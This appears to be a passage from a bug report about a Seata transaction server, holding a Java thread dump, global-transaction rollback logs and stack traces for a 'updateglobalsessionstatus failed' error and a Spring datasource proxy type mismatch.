sun.nio.ch.selectorimpl.select(selectorimpl.java:97) at io.netty.channel.nio.selectedselectionkeysetselector.select(selectedselectionkeysetselector.java:62) at io.netty.channel.nio.nioeventloop.select(nioeventloop.java:753) at io.netty.channel.nio.nioeventloop.run(nioeventloop.java:408) at io.netty.util.concurrent.singlethreadeventexecutor$5.run(singlethreadeventexecutor.java:897) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "discoveryclient-cacherefreshexecutor-0" #33 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.synchronousqueue$transferstack) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.synchronousqueue$transferstack.awaitfulfill(synchronousqueue.java:458) at java.util.concurrent.synchronousqueue$transferstack.transfer(synchronousqueue.java:362) at java.util.concurrent.synchronousqueue.take(synchronousqueue.java:924) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at java.lang.thread.run(thread.java:748) "discoveryclient-instanceinforeplicator-0" #32 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: timed_waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.parknanos(locksupport.java:215) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.awaitnanos(abstractqueuedsynchronizer.java:2078) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:1093) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:809) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at java.lang.thread.run(thread.java:748) "discoveryclient-1" #31 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: timed_waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.parknanos(locksupport.java:215) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.awaitnanos(abstractqueuedsynchronizer.java:2078) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:1093) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:809) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at java.lang.thread.run(thread.java:748) "discoveryclient-0" #30 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:1088) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:809) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at java.lang.thread.run(thread.java:748) "asyncresolver-bootstrap-0" #29 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: timed_waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.parknanos(locksupport.java:215) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.awaitnanos(abstractqueuedsynchronizer.java:2078) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:1093) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:809) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at java.lang.thread.run(thread.java:748) "eureka-jerseyclient-conn-cleaner2" #28 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: timed_waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.parknanos(locksupport.java:215) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.awaitnanos(abstractqueuedsynchronizer.java:2078) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:1093) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:809) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at java.lang.thread.run(thread.java:748) "nettyboss_1" #27 daemon prio=5 os_prio=0 tid= nid= runnable [ ] java.lang.thread.state: runnable at sun.nio.ch.epollarraywrapper.epollwait(native method) at sun.nio.ch.epollarraywrapper.poll(epollarraywrapper.java:269) at sun.nio.ch.epollselectorimpl.doselect(epollselectorimpl.java:93) at sun.nio.ch.selectorimpl.lockanddoselect(selectorimpl.java:86) - locked < > (a io.netty.channel.nio.selectedselectionkeyset) - locked < > (a java.util.collections$unmodifiableset) - locked < > (a sun.nio.ch.epollselectorimpl) at sun.nio.ch.selectorimpl.select(selectorimpl.java:97) at io.netty.channel.nio.selectedselectionkeysetselector.select(selectedselectionkeysetselector.java:62) at io.netty.channel.nio.nioeventloop.select(nioeventloop.java:753) at io.netty.channel.nio.nioeventloop.run(nioeventloop.java:408) at io.netty.util.concurrent.singlethreadeventexecutor$5.run(singlethreadeventexecutor.java:897) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "batchloggerprint_1" #26 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at io.seata.core.rpc.defaultservermessagelistenerimpl$batchlogrunnable.run(defaultservermessagelistenerimpl.java:201) at java.util.concurrent.executors$runnableadapter.call(executors.java:511) at java.util.concurrent.futuretask.run(futuretask.java:266) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "timeoutchecker_1" #25 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: timed_waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.parknanos(locksupport.java:215) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.awaitnanos(abstractqueuedsynchronizer.java:2078) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:1093) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:809) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "undologdelete_1" #23 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: timed_waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.parknanos(locksupport.java:215) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.awaitnanos(abstractqueuedsynchronizer.java:2078) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:1093) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:809) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "txtimeoutcheck_1" #22 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: timed_waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.parknanos(locksupport.java:215) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.awaitnanos(abstractqueuedsynchronizer.java:2078) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:1093) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:809) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "asynccommitting_1" #21 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: timed_waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.parknanos(locksupport.java:215) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.awaitnanos(abstractqueuedsynchronizer.java:2078) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:1093) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:809) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "retrycommitting_1" #20 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: timed_waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.parknanos(locksupport.java:215) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.awaitnanos(abstractqueuedsynchronizer.java:2078) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:1093) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:809) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "retryrollbacking_1" #19 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: timed_waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.parknanos(locksupport.java:215) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.awaitnanos(abstractqueuedsynchronizer.java:2078) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:1093) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:809) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "timer-0" #18 daemon prio=5 os_prio=0 tid= nid= in object.wait() [ ] java.lang.thread.state: timed_waiting (on object monitor) at java.lang.object.wait(native method) at java.util.timerthread.mainloop(timer.java:552) - locked < > (a java.util.taskqueue) at java.util.timerthread.run(timer.java:505) "abandoned connection cleanup thread" #17 daemon prio=5 os_prio=0 tid= nid= in object.wait() [ ] java.lang.thread.state: timed_waiting (on object monitor) at java.lang.object.wait(native method) at java.lang.ref.referencequeue.remove(referencequeue.java:144) - locked < > (a java.lang.ref.referencequeue$lock) at com.mysql.jdbc.abandonedconnectioncleanupthread.run(abandonedconnectioncleanupthread.java:41) "configoperate_2_2" #15 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "configoperate_1_2" #14 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "logback-2" #13 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:1088) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:809) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at java.lang.thread.run(thread.java:748) "logback-1" #12 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:1088) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:809) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at java.lang.thread.run(thread.java:748) "service thread" #11 daemon prio=9 os_prio=0 tid= nid= runnable [ ] java.lang.thread.state: runnable "c1 compilerthread3" #10 daemon prio=9 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: runnable "c2 compilerthread2" #9 daemon prio=9 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: runnable "c2 compilerthread1" #8 daemon prio=9 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: runnable "c2 compilerthread0" #7 daemon prio=9 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: runnable "jdwp event helper thread" #6 daemon prio=10 os_prio=0 tid= nid= runnable [ ] java.lang.thread.state: runnable "jdwp transport listener: dt_socket" #5 daemon prio=10 os_prio=0 tid= nid= runnable [ ] java.lang.thread.state: runnable "signal dispatcher" #4 daemon prio=9 os_prio=0 tid= nid= runnable [ ] java.lang.thread.state: runnable "finalizer" #3 daemon prio=8 os_prio=0 tid= nid= in object.wait() [ ] java.lang.thread.state: waiting (on object monitor) at java.lang.object.wait(native method) at java.lang.ref.referencequeue.remove(referencequeue.java:144) - locked < > (a java.lang.ref.referencequeue$lock) at java.lang.ref.referencequeue.remove(referencequeue.java:165) at java.lang.ref.finalizer$finalizerthread.run(finalizer.java:216) "reference handler" #2 daemon prio=10 os_prio=0 tid= nid= in object.wait() [ ] java.lang.thread.state: waiting (on object monitor) at java.lang.object.wait(native method) at java.lang.object.wait(object.java:502) at java.lang.ref.reference.tryhandlepending(reference.java:191) - locked < > (a java.lang.ref.reference$lock) at java.lang.ref.reference$referencehandler.run(reference.java:153) "main" #1 prio=5 os_prio=0 tid= nid= in object.wait() [ ] java.lang.thread.state: waiting (on object monitor) at java.lang.object.wait(native method) - waiting on < > (a io.netty.channel.abstractchannel$closefuture) at java.lang.object.wait(object.java:502) at io.netty.util.concurrent.defaultpromise.await(defaultpromise.java:231) - locked < > (a io.netty.channel.abstractchannel$closefuture) at io.netty.channel.defaultchannelpromise.await(defaultchannelpromise.java:131) at io.netty.channel.defaultchannelpromise.await(defaultchannelpromise.java:30) at io.netty.util.concurrent.defaultpromise.sync(defaultpromise.java:337) at io.netty.channel.defaultchannelpromise.sync(defaultchannelpromise.java:119) at io.netty.channel.defaultchannelpromise.sync(defaultchannelpromise.java:30) at io.seata.core.rpc.netty.abstractrpcremotingserver.start(abstractrpcremotingserver.java:158) at io.seata.core.rpc.netty.rpcserver.init(rpcserver.java:129) at io.seata.server.server.main(server.java:92) "vm thread" os_prio=0 tid= nid= runnable "gc task thread#0 (parallelgc)" os_prio=0 tid= nid= runnable "gc task thread#1 (parallelgc)" os_prio=0 tid= nid= runnable "gc task thread#2 (parallelgc)" os_prio=0 tid= nid= runnable "gc task thread#3 (parallelgc)" os_prio=0 tid= nid= runnable "gc task thread#4 (parallelgc)" os_prio=0 tid= nid= runnable "gc task thread#5 (parallelgc)" os_prio=0 tid= nid= runnable "gc task thread#6 (parallelgc)" os_prio=0 tid= nid= runnable "gc task thread#7 (parallelgc)" os_prio=0 tid= nid= runnable "vm periodic task thread" os_prio=0 tid= nid= waiting on condition jni global references: 5620
``` #### server yql
global_table 1
redis ``` ```
![image](
2019-12-18 18:20:37.456 info [serverhandlerthread_1_500]io.seata.server.coordinator.defaultcore.begin:154 -successfully begin global transaction xid = 192.168.117.1:8091:2030392429
2019-12-18 18:20:37.849 warn [configoperate_2_2]io.seata.config.fileconfiguration.run:265 -could not found property store.file.max-branch-session-size, try to use default value instead.
2019-12-18 18:20:37.852 warn [configoperate_2_2]io.seata.config.fileconfiguration.run:265 -could not found property store.db.min-conn, try to use default value instead.
2019-12-18 18:20:37.853 warn [configoperate_2_2]io.seata.config.fileconfiguration.run:265 -could not found property store.db.max-conn, try to use default value instead.
2019-12-18 18:20:37.853 warn [configoperate_2_2]io.seata.config.fileconfiguration.run:265 -could not found property store.db.min-conn, try to use default value instead.
2019-12-18 18:20:37.853 warn [configoperate_2_2]io.seata.config.fileconfiguration.run:265 -could not found property store.db.min-conn, try to use default value instead.
2019-12-18 18:20:37.861 info [serverhandlerthread_1_500]io.seata.common.loader.enhancedserviceloader.loadfile:237 -load lockstore[db] extension by class[io.seata.core.store.db.lockstoredatabasedao]
2019-12-18 18:20:37.861 info [serverhandlerthread_1_500]io.seata.common.loader.enhancedserviceloader.loadfile:237 -load locker[db] extension by class[io.seata.server.lock.db.databaselocker]
2019-12-18 18:20:38.045 info [serverhandlerthread_1_500]io.seata.server.coordinator.defaultcore.lambda$branchregister$0:98 -successfully register branch xid = 192.168.117.1:8091:2030392429, branchid = 2030392431
2019-12-18 18:20:38.333 info [serverhandlerthread_1_500]io.seata.server.coordinator.defaultcore.branchreport:126 -successfully branch report xid = 192.168.117.1:8091:2030392429, branchid = 2030392431
2019-12-18 18:20:38.461 info [serverhandlerthread_1_500]io.seata.server.coordinator.defaultcore.lambda$branchregister$0:98 -successfully register branch xid = 192.168.117.1:8091:2030392429, branchid = 2030392435
2019-12-18 18:20:38.524 info [serverhandlerthread_1_500]io.seata.server.coordinator.defaultcore.branchreport:126 -successfully branch report xid = 192.168.117.1:8091:2030392429, branchid = 2030392435
2019-12-18 18:20:38.627 info [serverhandlerthread_1_500]io.seata.server.coordinator.defaultcore.lambda$branchregister$0:98 -successfully register branch xid = 192.168.117.1:8091:2030392429, branchid = 2030392438
2019-12-18 18:20:38.689 info [serverhandlerthread_1_500]io.seata.server.coordinator.defaultcore.branchreport:126 -successfully branch report xid = 192.168.117.1:8091:2030392429, branchid = 2030392438
2019-12-18 18:20:38.758 info [serverhandlerthread_1_500]io.seata.server.coordinator.defaultcore.lambda$branchregister$0:98 -successfully register branch xid = 192.168.117.1:8091:2030392429, branchid = 2030392441
2019-12-18 18:20:38.799 info [serverhandlerthread_1_500]io.seata.server.coordinator.defaultcore.branchreport:126 -successfully branch report xid = 192.168.117.1:8091:2030392429, branchid = 2030392441
2019-12-18 18:20:38.989 info [serverhandlerthread_1_500]io.seata.server.coordinator.defaultcore.lambda$branchregister$0:98 -successfully register branch xid = 192.168.117.1:8091:2030392429, branchid = 2030392445
2019-12-18 18:20:39.320 info [serverhandlerthread_1_500]io.seata.server.coordinator.defaultcore.branchreport:126 -successfully branch report xid = 192.168.117.1:8091:2030392429, branchid = 2030392445
2019-12-18 18:20:39.499 info [serverhandlerthread_1_500]io.seata.server.coordinator.defaultcore.doglobalrollback:417 -successfully rollback branch xid=192.168.117.1:8091:2030392429 branchid=2030392445
2019-12-18 18:20:39.639 info [serverhandlerthread_1_500]io.seata.server.coordinator.defaultcore.doglobalrollback:417 -successfully rollback branch xid=192.168.117.1:8091:2030392429 branchid=2030392441
2019-12-18 18:20:39.768 info [serverhandlerthread_1_500]io.seata.server.coordinator.defaultcore.doglobalrollback:417 -successfully rollback branch xid=192.168.117.1:8091:2030392429 branchid=2030392438
2019-12-18 18:20:40.021 info [retryrollbacking_1]io.seata.server.coordinator.defaultcore.doglobalrollback:417 -successfully rollback branch xid=192.168.117.1:8091:2030392429 branchid=2030392435
2019-12-18 18:20:40.076 info [serverhandlerthread_1_500]io.seata.server.coordinator.defaultcore.doglobalrollback:417 -successfully rollback branch xid=192.168.117.1:8091:2030392429 branchid=2030392435
2019-12-18 18:20:40.409 info [retryrollbacking_1]io.seata.server.coordinator.defaultcore.doglobalrollback:417 -successfully rollback branch xid=192.168.117.1:8091:2030392429 branchid=2030392431
2019-12-18 18:20:40.476 info [serverhandlerthread_1_500]io.seata.server.coordinator.defaultcore.doglobalrollback:417 -successfully rollback branch xid=192.168.117.1:8091:2030392429 branchid=2030392431
2019-12-18 18:20:40.526 info [retryrollbacking_1]io.seata.server.coordinator.defaultcore.doglobalrollback:463 -successfully rollback global, xid = 192.168.117.1:8091:2030392429
2019-12-18 18:20:40.552 error[serverhandlerthread_1_500]io.seata.core.exception.abstractexceptionhandler.exceptionhandletemplate:120 -catch transactionexception while do rpc, request: xid=192.168.117.1:8091:2030392429,extradata=null
io.seata.core.exception.transactionexception: global rollback request failed
xid=192.168.117.1:8091:2030392429, msg=updateglobalsessionstatus failed
at io.seata.server.abstracttcinboundhandler$3.execute(abstracttcinboundhandler.java:121) at io.seata.server.abstracttcinboundhandler$3.execute(abstracttcinboundhandler.java:113) at io.seata.core.exception.abstractexceptionhandler.exceptionhandletemplate(abstractexceptionhandler.java:117) at io.seata.server.abstracttcinboundhandler.handle(abstracttcinboundhandler.java:113) at io.seata.core.protocol.transaction.globalrollbackrequest.handle(globalrollbackrequest.java:34) at io.seata.server.coordinator.defaultcoordinator.onrequest(defaultcoordinator.java:541) at io.seata.core.rpc.defaultservermessagelistenerimpl.ontrxmessage(defaultservermessagelistenerimpl.java:92) at io.seata.core.rpc.netty.rpcserver.dispatch(rpcserver.java:296) at io.seata.core.rpc.netty.abstractrpcremoting$3.run(abstractrpcremoting.java:368) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748)
caused by: io.seata.common.exception.storeexception: updateglobalsessionstatus failed
at io.seata.server.session.db.databasesessionmanager.updateglobalsessionstatus(databasesessionmanager.java:109) at io.seata.server.session.abstractsessionmanager.onstatuschange(abstractsessionmanager.java:122) at io.seata.server.session.globalsession.changestatus(globalsession.java:139) at io.seata.server.session.sessionhelper.endrollbacked(sessionhelper.java:95) at io.seata.server.coordinator.defaultcore.doglobalrollback(defaultcore.java:456) at io.seata.server.coordinator.defaultcore.rollback(defaultcore.java:362) at io.seata.server.coordinator.defaultcoordinator.doglobalrollback(defaultcoordinator.java:183) at io.seata.server.abstracttcinboundhandler$3.execute(abstracttcinboundhandler.java:118) ..
12 common frames omitted
org.springframework.beans.factory.beannotofrequiredtypeexception: bean named 'datasource' is expected to be of type 'javax.sql.datasource' but was actually of type 'com.sun.proxy.$proxy77' at org.springframework.beans.factory.support.abstractbeanfactory.dogetbean(abstractbeanfactory.java:378) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractbeanfactory.getbean(abstractbeanfactory.java:202) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.config.dependencydescriptor.resolvecandidate(dependencydescriptor.java:208) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.defaultlistablebeanfactory.doresolvedependency(defaultlistablebeanfactory.java:1138) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.defaultlistablebeanfactory.resolvedependency(defaultlistablebeanfactory.java:1066) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.constructorresolver.resolveautowiredargument(constructorresolver.java:835) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.constructorresolver.createargumentarray(constructorresolver.java:741) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.constructorresolver.instantiateusingfactorymethod(constructorresolver.java:467) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.instantiateusingfactorymethod(abstractautowirecapablebeanfactory.java:1173) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbeaninstance(abstractautowirecapablebeanfactory.java:1067) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.docreatebean(abstractautowirecapablebeanfactory.java:513) ~[spring-beans-4.3.13.release.jar:4.3.13.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbean(abstractautowirecapablebeanfactory.java:483) 